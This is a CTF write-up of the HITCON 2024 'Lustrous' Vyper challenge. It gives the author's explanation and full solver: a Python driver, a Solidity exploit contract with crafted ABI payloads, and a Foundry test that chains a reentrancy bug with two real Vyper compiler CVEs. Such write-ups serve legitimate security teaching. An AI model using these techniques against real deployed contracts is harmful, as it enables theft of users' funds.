---
title: "Lustrous - Hitcon CTF 2024 Quals"
category: "blockchain"
subcategory: "smart-contract"
type: "writeup"
tags: ["minaminao-my-ctf-challenges", "author-solution", "challenge-source", "solidity", "web3py", "proof-of-work", "subprocess", "blockchain", "hitcon-ctf-2024-quals"]
summary: "Lustrous is a Vyper challenge created for HITCON CTF 2024 Quals."
source:
  name: "minaminao/my-ctf-challenges"
  url: "https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2024-quals/lustrous"
license: "none stated"
ctf:
  name: "Hitcon CTF 2024 Quals"
  year: 2024
  challenge: "Lustrous"
---

## Challenge

- **Author:** [minaminao](https://github.com/minaminao)
- **Source:** <https://github.com/minaminao/my-ctf-challenges/tree/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2024-quals/lustrous>
- **CTF:** Hitcon CTF 2024 Quals

---

# Lustrous

**Lustrous** is a Vyper challenge created for HITCON CTF 2024 Quals.

This directory includes:
- `server`: the challenge server based on https://github.com/minaminao/tokyo-payload
- `solver`: the author's solver

The challenge contract is [land_of_the_lustrous.vy](server/src/contracts/land_of_the_lustrous.vy).

NOTE: This version has been revised to address an unintended solution.

## Description

"In a world inhabited by crystalline lifeforms called The Lustrous, every unique gem must fight for their way of life against the threat of lunarians who would turn them into decorations." – Land of the Lustrous

```
nc lustrous.chal.hitconctf.com 31337
```

## Generate the distributed files

```
make generate-distfiles
```

## Launch a challenge server

```
make start-challenge-server
```

## Access the challenge server

```
nc localhost 31337
```

Good luck!

---

## Writeup

[Brief Writeup](solver/README.md)

## Run the author's solver

Local:
```
make run-solver
```

Remote:
```
make run-solver-remote
```


## Author's solver notes

# Solver

## Brief Writeup

A Vyper contract is provided.
After thoroughly reading it, only a minor reentrancy vulnerability is found, making it unsolvable.
This leads to suspicions of a bug in the compiler's bytecode generation.

On investigating for exploitable vulnerabilities, it is discovered that the `concat` built-in function has a vulnerability (ref: [CVE-2024-22419](https://github.com/vyperlang/vyper/security/advisories/GHSA-2q8v-3gqq-4f8p)).
This vulnerability means that when a function F calls `concat`, the leading bytes of the first variable declared in the function G that calls F is overwritten with zero.
By combining this with the reentrancy vulnerability, it is possible to overwrite the leading bytes of the negative health value with zero, making the value very large.
This gives a significant advantage in battles.

Further investigating reveals that the return value of a call undergoes internal ABI decoding.
This leads to the realization that an ABI decoding vulnerability can be exploited (ref: [CVE-2024-26149](https://github.com/vyperlang/vyper/security/advisories/GHSA-9p8r-4xp4-gw5w)).
Specifically, by setting the read position of the dynamic array in the return value to a negative value, it is possible to copy the lunarian's actions, resulting in a complete draw.
If all rounds end in a draw, the side with the higher health wins, providing a way to clear the final stage.

Finally, by strategically combining these vulnerabilities and progressing/retreating through the stages, this challenge is solved.
The lunarian's unpredictable behavior can be managed through conditional branching based on state and return values, along with strategic use of `revert`.


## Solver: `solve.py`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2024-quals/lustrous/solver/solve.py>

```python
import hashlib
import json
import os
import subprocess

from pwn import remote
from web3 import Web3

CHALLENGE_HOST = os.getenv("CHALLENGE_HOST", "localhost")
CHALLENGE_PORT = os.getenv("CHALLENGE_PORT", "31337")

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recvuntil(b"action? ")
r.sendline(b"1")


def solve_pow(r: remote) -> None:
    r.recvuntil(b'sha256("')
    preimage_prefix = r.recvuntil(b'"')[:-1]
    r.recvuntil(b"start with ")
    bits = int(r.recvuntil(b" "))
    for i in range(0, 1 << 32):
        your_input = str(i).encode()
        preimage = preimage_prefix + your_input
        digest = hashlib.sha256(preimage).digest()
        digest_int = int.from_bytes(digest, "big")
        if digest_int < (1 << (256 - bits)):
            break
    r.recvuntil(b"YOUR_INPUT = ")
    r.sendline(your_input)


solve_pow(r)

r.recvuntil(b"uuid:")
uuid = r.recvline().strip()
r.recvuntil(b"rpc endpoint:")
rpc_url = r.recvline().strip().decode().replace("TODO", CHALLENGE_HOST)
r.recvuntil(b"private key:")
private_key = r.recvline().strip().decode()
r.recvuntil(b"your address:")
player_addr = r.recvline().strip().decode()
r.recvuntil(b"challenge contract:")
land_addr = r.recvline().strip().decode()
r.close()

web3 = Web3(Web3.HTTPProvider(rpc_url))

res = subprocess.run(
    [
        "forge",
        "create",
        "src/Exploit.sol:Master",
        "--private-key",
        private_key,
        "--constructor-args",
        land_addr,
        "--value",
        "1ether",
        "--rpc-url",
        rpc_url,
        "--json",
    ],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
assert res.returncode == 0

master_addr = json.loads(res.stdout)["deployedTo"]
print("master address", master_addr)


def cast_call(addr: str, sig: str) -> str:
    # use cast instead of web3py because it's easier
    res = subprocess.run(
        [
            "cast",
            "call",
            addr,
            sig,
            "--rpc-url",
            rpc_url,
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    return res.stdout.decode().strip()


master_turn = True
for i in range(0, 10000):
    print()
    if cast_call(land_addr, "is_solved()(bool)") == "true":
        print("solved!")
        break
    stage = cast_call(land_addr, "stage()(uint8)")
    indicator = cast_call(master_addr, "indicator()(uint256)")
    print(f"{i=}", "master" if master_turn else "lunarian")
    print(f"stage {stage} indicator {indicator}")
    if master_turn:
        res = subprocess.run(
            [
                "cast",
                "send",
                master_addr,
                "prepareBattle()",
                "--private-key",
                private_key,
                "--rpc-url",
                rpc_url,
                "--json",
                "--gas-limit",
                str(1_000_000),  # to avoid an error in eth_estimateGas
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        number = int(json.loads(res.stdout)["blockNumber"], 16)
        status = json.loads(res.stdout)["status"]
        print("block number", number, "status", status)
        if status == "0x1":
            master_turn = False
    else:
        r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
        r.recvuntil(b"action? ")
        r.sendline(b"3")
        solve_pow(r)
        r.recvuntil(b"uuid please: ")
        r.sendline(uuid)
        r.recvuntil(b"tx status: ")
        tx_status = r.recvline().strip().decode()
        r.recvuntil(b"tx hash: ")
        tx_hash = r.recvline().strip().decode()
        r.close()

        if tx_status == "1":
            master_turn = True

r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
r.recv()
r.sendline(b"4")
r.recvuntil(b"uuid please: ")
r.sendline(uuid)
r.recvuntil(b"Here's the flag: \n")
flag = r.recvline().strip()
print(flag)
```


## Solver: `Exploit.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2024-quals/lustrous/solver/src/Exploit.sol>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ILandOfTheLustrous, Gem} from "./ILandOfTheLustrous.sol";

contract Master {
    bytes constant PAYLOAD_ZERO_100 =
        hex"00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000064";
    bytes constant PAYLOAD_ZERO_200 =
        hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000c8";
    bytes constant PAYLOAD_COPY =
        hex"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffb4400000000000000000000000000000000000000000000000000000000000000000";
    int256 constant ACTIVE_HEALTH_THRESHOLD = 64;

    ILandOfTheLustrous land;
    uint8 public indicator = 0;

    constructor(address landAddr) payable {
        require(msg.value == 1 ether);
        land = ILandOfTheLustrous(landAddr);
        land.register_master();
    }

    function prepareBattle() public {
        int256 threshold = 150;
        if (indicator == 0) {
            // stage 0
            Gem memory gem = land.create_gem{value: 1 ether}();
            require(gem.health > threshold && gem.attack > threshold && gem.hardness > threshold, "bad gem");
            land.assign_gem(0);
        } else if (indicator == 1) {
            // stage 1
            // nop
        } else if (indicator == 2) {
            // stage 0
            Gem memory gem = land.create_gem{value: 1 ether}();
            require(gem.health > threshold && gem.attack > threshold && gem.hardness > threshold, "bad gem");
            land.assign_gem(1);
        } else if (indicator == 3) {
            if (land.stage() == 1) {
                // if gem 1 wins without being inactive in the previous battle
                land.pray_gem();
                land.assign_gem(0);
                indicator -= 2; // -> indicator 2
            } else {
                land.assign_gem(0);
            }
        } else if (indicator == 4) {
            if (land.stage() == 1) {
                // if gem 0 wins without being destroyed in the previous battle
                // normally battle gem 0 to destroy
                indicator--; // -> indicator 4
            }
        }
        indicator++;
    }

    // sneak_case since the signature is specified in the Vyper contract
    function decide_continue_battle(uint256, /* round */ int256 /* lunarian_health */ ) public returns (bool) {
        if (indicator == 1) {
            revert("reset round 1, loss");
        } else if (indicator == 3) {
            Gem memory gem = land.gems(getGemId(1));
            require(0 <= gem.health && gem.health < ACTIVE_HEALTH_THRESHOLD, "reset round 2, not inactive");
        } else if (indicator == 4) {
            Gem memory gem0 = land.gems(getGemId(0));
            Gem memory gem1 = land.gems(getGemId(1));
            require(gem0.health + gem1.health < 0, "reset round 3, must be negative");
            land.merge_gems();
        }
        return false;
    }

    function getGemId(uint32 sequence) internal view returns (bytes32) {
        bytes20 master_bytes = bytes20(address(this));
        bytes4 sequence_bytes = bytes4(sequence);
        return keccak256(abi.encodePacked(master_bytes, sequence_bytes));
    }

    receive() external payable {}

    fallback(bytes calldata /* input */ ) external returns (bytes memory output) {
        if (msg.sig == bytes4(keccak256(bytes("get_actions()")))) {
            if (indicator == 1) {
                require(land.stage() == 0, "stage 0");
                return PAYLOAD_ZERO_100;
            } else if (indicator == 2) {
                require(land.stage() == 1, "stage 1");
                return PAYLOAD_COPY;
            } else if (indicator == 3) {
                require(land.stage() == 0, "stage 0");
                return PAYLOAD_ZERO_100;
            } else if (indicator == 4) {
                if (land.stage() == 0) {
                    return PAYLOAD_ZERO_100;
                } else {
                    return PAYLOAD_ZERO_200;
                }
            } else {
                return PAYLOAD_COPY;
            }
        }
    }
}
```


## Solver: `Exploit.t.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2024-quals/lustrous/solver/src/Exploit.t.sol>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Master} from "src/Exploit.sol";
import {ILandOfTheLustrous} from "src/ILandOfTheLustrous.sol";

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    address lunarianAddr = makeAddr("lunarian");
    ILandOfTheLustrous public land;

    function setUp() public {
        vm.deal(playerAddr, 1.5 ether);
        vm.deal(lunarianAddr, 1_000_000 ether);
        vm.startPrank(lunarianAddr, lunarianAddr);
        land = ILandOfTheLustrous(deployCode("challenge/land_of_the_lustrous.vy", 1_000_000 ether));
        vm.stopPrank();
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);
        Master master = new Master{value: 1 ether}(address(land));
        vm.stopPrank();

        bool master_turn = true;
        for (uint256 i = 0; i < 100; i++) {
            vm.roll(i);
            console.log();
            console.log("block", i);
            console.log("stage", land.stage(), "indicator", master.indicator());

            if (master_turn) {
                console.log("master turn");
                vm.startPrank(playerAddr, playerAddr);
                try master.prepareBattle() {
                    master_turn = false;
                } catch Error(string memory reason) {
                    console.log(reason);
                }
                vm.stopPrank();
            } else {
                console.log("lunarian turn");
                vm.startPrank(lunarianAddr, lunarianAddr);
                uint256 rounds = 100 * (uint256(land.stage()) + 1);
                uint8[] memory lunarian_actions = new uint8[](rounds);
                bytes32 tmp = keccak256(abi.encode(block.number));
                for (uint256 j = 0; j < rounds; j++) {
                    lunarian_actions[j] = uint8(uint256(tmp) % 3);
                    tmp = keccak256(abi.encode(tmp));
                }
                try land.battle(lunarian_actions) {
                    master_turn = true;
                } catch Error(string memory reason) {
                    console.log(reason);
                }
                vm.stopPrank();
            }

            if (land.is_solved()) {
                console.log("solved");
                break;
            }
        }

        require(land.is_solved(), "not solved");
    }
}
```


## Solver: `ILandOfTheLustrous.sol`

<https://github.com/minaminao/my-ctf-challenges/blob/c9c9ddb171c2db93b282f74ff9f38c7312668d7b/ctfs/hitcon-ctf-2024-quals/lustrous/solver/src/ILandOfTheLustrous.sol>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

struct Gem {
    int256 health;
    int256 max_health;
    int256 attack;
    int256 hardness;
    uint256 status;
}

interface ILandOfTheLustrous {
    function roles(address) external returns (uint256);
    function sequences(address) external returns (uint32);
    function stage() external returns (uint8);
    function gems(bytes32) external returns (Gem memory);
    function assigned_gems(address) external returns (uint32);
    function continued(address) external returns (bool);

    function register_master() external;
    function create_gem() external payable returns (Gem memory);
    function merge_gems() external returns (Gem memory);
    function pray_gem() external;
    function assign_gem(uint32 sequence) external;
    function battle(uint8[] memory lunarian_actions) external returns (bool, int256, int256);
    function continue_battle() external payable;
    function is_solved() external returns (bool);
}
```
